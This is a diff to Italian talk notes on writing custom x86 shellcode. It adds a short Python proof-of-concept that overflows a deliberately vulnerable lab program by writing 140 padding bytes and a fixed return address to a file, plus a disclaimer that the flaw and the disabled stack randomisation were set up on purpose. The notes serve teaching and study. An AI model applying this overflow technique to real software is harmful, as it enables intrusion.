@@ -28,10 +28,10 @@ BASSO
 
 ## Skill richieste
 
-Conoscenze base di assembler x86
-Sapere cos'è una _system call_
-Un pizzico di python o ruby o il linguaggio che più vi piace a cui accodare il
-nostro shellcode.
+* Conoscenze base di assembler x86
+* Sapere cos'è una _system call_
+* Un pizzico di python o ruby o il linguaggio che più vi piace a cui accodare
+  il nostro shellcode.
 
 ## Cosa mi serve
 
@@ -61,4 +61,29 @@ sulla lunghezza dei dati letti da file.
 
 Nel caso il file di testo sia costituito da troppi caratteri, dopo 140 byte
 avremmo la sovrascittura del registro EIP e di fatto, l'inizio della nostra
-storia. 
+storia.
+
+Il PoC del nostro exploit sarà questo:
+``` python
+#!/usr/bin/env python3
+
+import os;
+
+# 0x5655625c
+eip="\x5c\x62\x55\x56"
+shellcode = "A"*140+eip
+f = open("pwnme.txt","w")
+f.write(shellcode)
+f.close()
+```
+
+### Disclaimer
+
+Questo talk non è su come trovare un buffer overflow ma su come customizzare il
+nostro shellcode. Il programma vulnerabile quindi è stato scritto introducendo
+la vulnerabilità in maniera forzata, in particolare:
+
+* è stato aggiunto dell'inline assembler per mettere a disposizione
+  l'istruzione JMP ESP
+* avendo disattivato la randomizzazione dello stack, ho il nuovo valore del
+  registro EIP sempre fisso
